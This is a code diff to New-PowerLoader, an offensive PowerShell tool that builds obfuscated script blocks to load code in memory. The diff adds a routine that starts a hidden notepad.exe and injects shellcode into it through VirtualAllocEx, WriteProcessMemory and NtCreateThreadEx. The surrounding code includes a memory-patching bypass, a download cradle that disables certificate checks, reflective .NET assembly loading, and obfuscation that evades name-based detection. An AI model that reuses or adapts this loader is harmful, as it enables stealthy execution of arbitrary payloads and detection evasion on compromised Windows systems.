@@ -1,7 +1,7 @@
 function New-PowerLoader {
 <#
 .SYNOPSIS
-    Build script block which safely loads PowerShell or .NET assembly.
+    Build script block which safely loads PowerShell, .NET assembly and shellcode.
 
     Author: Timothee MENOCHET (@_tmenochet)
 
@@ -34,7 +34,7 @@ function New-PowerLoader {
 #>
     [CmdletBinding()]
     Param (
-        [ValidateSet("PoSh","NetAsm")]
+        [ValidateSet("PoSh","NetAsm","Shellcode")]
         [string]
         $Type = "PoSh",
 
@@ -125,9 +125,13 @@ function New-PowerLoader {
             $srcLoader = ${function:Invoke-NetLoader}.Ast.Extent.Text + [Environment]::NewLine
             $srcLoader += 'Invoke-NetLoader -Code $code -ArgumentList $args'
         }
+        'Shellcode' {
+            $srcLoader = ${function:Invoke-ShellcodeLoader}.Ast.Extent.Text + [Environment]::NewLine
+            $srcLoader += 'Invoke-ShellcodeLoader -Code $code'
+        }
     }
     $script = $srcCode + $srcArgs + $srcBypass + $srcLoader
-    $words = @('Get-DecodedByte','Invoke-DownloadCradle','Invoke-MemoryPatch','Invoke-PoshLoader','Invoke-NetLoader','Remove-PoshComments')
+    $words = @('Get-DecodedByte','Invoke-DownloadCradle','Invoke-MemoryPatch','Invoke-PoshLoader','Invoke-NetLoader','Invoke-ShellcodeLoader','Remove-PoshComments')
     $script = Get-ObfuscatedString -InputString $script -BlackList $words
     return [ScriptBlock]::Create($script)
 }
@@ -167,8 +171,8 @@ function Local:Get-EncodedByte {
         [byte[]] $ByteArray
     )
 
-    [IO.MemoryStream] $output = New-Object System.IO.MemoryStream
-    $gzipStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
+    [IO.MemoryStream] $output = New-Object IO.MemoryStream
+    $gzipStream = New-Object IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
     $gzipStream.Write($ByteArray, 0, $ByteArray.Length)
     $gzipStream.Close()
     $output.Close()
@@ -183,9 +187,9 @@ function Local:Get-DecodedByte {
     )
 
     $byteArray = [Convert]::FromBase64String($EncBytes)
-    $input = New-Object System.IO.MemoryStream(,$byteArray)
-    $output = New-Object System.IO.MemoryStream
-    $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
+    $input = New-Object IO.MemoryStream(,$byteArray)
+    $output = New-Object IO.MemoryStream
+    $gzipStream = New-Object IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
     $gzipStream.CopyTo($output)
     $gzipStream.Close()
     $input.Close()
@@ -199,10 +203,10 @@ function Local:Invoke-MemoryPatch {
         [byte[]] $Patch
     )
 
-    $win32 = @"
+    Add-Type @"
 using System;
 using System.Runtime.InteropServices;
-public class Win32 {
+public class Kernel32 {
 [DllImport("kernel32")]
 public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 [DllImport("kernel32")]
@@ -211,11 +215,10 @@ public static extern IntPtr LoadLibrary(string name);
 public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 }
 "@
-    Add-Type $win32
-    $address = [Win32]::GetProcAddress([Win32]::LoadLibrary($Dll), $Func)
+    $address = [Kernel32]::GetProcAddress([Kernel32]::LoadLibrary($Dll), $Func)
     $a = 0
     $b = 0
-    [Win32]::VirtualProtect($address, [UInt32]$Patch.Length, 0x40, [ref]$a) | Out-Null
+    [Kernel32]::VirtualProtect($address, [UInt32]$Patch.Length, 0x40, [ref]$a) | Out-Null
     try {
         [Runtime.InteropServices.Marshal]::Copy($Patch, 0, $address, [UInt32]$Patch.Length)
     }
@@ -223,7 +226,7 @@ public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint 
         Write-Error "Memory patch failed."
     }
     finally {
-        [Win32]::VirtualProtect($address, [UInt32]$Patch.Length, $a, [ref]$b) | Out-Null
+        [Kernel32]::VirtualProtect($address, [UInt32]$Patch.Length, $a, [ref]$b) | Out-Null
     }
 }
 
@@ -236,14 +239,14 @@ function Local:Invoke-DownloadCradle {
     $code = $null
     try {
         [Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
-        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]3072
         $client = [Net.WebRequest]::Create($URL)
         $client.Proxy = [Net.WebRequest]::GetSystemWebProxy()
         $client.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
         $response = $client.GetResponse()
         $respStream = $response.GetResponseStream()
         $buffer = New-Object byte[] $response.ContentLength
-        $writeStream = New-Object System.IO.MemoryStream $response.ContentLength
+        $writeStream = New-Object IO.MemoryStream $response.ContentLength
         do {
             $bytesRead = $respStream.Read($buffer, 0, $buffer.Length)
             $writeStream.Write($buffer, 0, $bytesRead)
@@ -284,7 +287,7 @@ function Local:Invoke-NetLoader {
     $output = New-Object IO.StringWriter
     [Console]::SetOut($output)
     $assembly = [Reflection.Assembly]::Load([byte[]]$Code)
-    $al = New-Object -TypeName System.Collections.ArrayList
+    $al = New-Object -TypeName Collections.ArrayList
     $al.add($ArgumentList) | Out-Null
     try {
         $assembly.EntryPoint.Invoke($null, $al.ToArray())
@@ -295,4 +298,55 @@ function Local:Invoke-NetLoader {
     finally {
         Write-Output $output.ToString()
     }
+}
+
+function Local:Invoke-ShellcodeLoader {
+    Param (
+        [Parameter(Mandatory=$True)]
+        [ValidateNotNullOrEmpty()]
+        [Byte[]]
+        $Code
+    )
+
+    Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr OpenProcess(UInt32 processAccess, bool bInheritHandle, int processId);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, int flAllocationType, int flProtect);
+    [DllImport("kernel32.dll")]
+    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, ref UInt32 lpNumberOfBytesWritten);
+    [DllImport("kernel32.dll")]
+    public static extern bool CloseHandle(IntPtr hObject);
+    [DllImport("ntdll.dll")]
+    public static extern UInt32 NtCreateThreadEx(
+        ref IntPtr hThread,
+        UInt32 DesiredAccess,
+        IntPtr ObjectAttributes,
+        IntPtr ProcessHandle,
+        IntPtr lpStartAddress,
+        IntPtr lpParameter,
+        bool CreateSuspended,
+        UInt32 StackZeroBits,
+        UInt32 SizeOfStackCommit,
+        UInt32 SizeOfStackReserve,
+        IntPtr lpBytesBuffer
+    );
+}
+"@
+    $procStart = [wmiclass]"\\.\root\cimv2:Win32_ProcessStartup"
+    $procStart.Properties["ShowWindow"].Value = 0
+    $procID = (([wmiclass]"\\.\root\cimv2:Win32_Process").Create("notepad.exe", $null, $procStart)).ProcessId
+    $hProc = [Win32]::OpenProcess(0x001F0FFF, $false, $procID)
+    $address = [Win32]::VirtualAllocEx($hProc, 0, $Code.Length + 1, 0x3000, 0x40)
+    [Win32]::WriteProcessMemory($hProc, $address, $Code, $Code.Length, [ref] 0) | Out-Null
+    $hRemoteThread = [IntPtr]::Zero
+    [Win32]::NtCreateThreadEx([ref]$hRemoteThread, 0x1FFFFF, [IntPtr]::Zero, $hProc, $address, [IntPtr]::Zero, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero) | Out-Null
+    if ($hRemoteThread -ne [IntPtr]::Zero) {
+        Write-Output "Successful injection."
+        [Win32]::CloseHandle($hRemoteThread) | Out-Null
+    }
+    [Win32]::CloseHandle($hProc) | Out-Null
 }
